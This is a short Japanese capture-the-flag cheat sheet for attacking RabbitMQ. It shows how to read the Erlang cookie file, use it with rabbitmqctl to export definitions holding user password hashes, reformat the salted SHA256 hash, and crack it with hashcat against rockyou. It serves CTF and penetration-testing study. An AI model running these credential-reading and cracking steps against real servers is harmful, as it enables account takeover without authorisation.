# RabbitMQ

## CTF 定石

1. Cookie を入手
1. 設定をエクスポート（パスワードハッシュが含まれる）
1. パスワードをオフラインクラック

## 手順

### Cookie を入手

```
/var/lib/rabbitmq/.erlang.cookie
または、誰かのホームディレクトリ
/home/user/.erlang.cookie
```

### 設定をエクスポート

```shell
# 名前確認
azrael@forge:~/chatbotServer$ epmd -names
epmd: up and running on port 4369 with data:
name rabbit at port 25672
```

```shell
sudo rabbitmqctl --erlang-cookie 'COOKIE_STRING' --node rabbit@<IP> export_definitions ./definitions.json
```

```shell
cat /tmp/definitions.json | jq '.users[] | select(.name == "root")'
```

### パスワードクラック

`base64( SHA256( password + salt ) + salt )`

- ソルトは ランダムな 4 バイト
- ハッシュとソルトを連結して base64 でエンコード
- hashing_algorithm が "rabbit_password_hashing_sha256"

```shell
# 先頭4バイト（8文字）がSaltになるので、hash:salt の形に加工する
echo -n 'ハッシュ' | base64 -d | xxd -p -c 100 | awk '{print substr($0, 9) ":" substr($0, 1, 8)}'
```

出力例：  
`295.............................73585:e3d7ba85`

```shell
# クラック
hashcat -m 1410 -a 0 hash.txt rockyou.txt
```
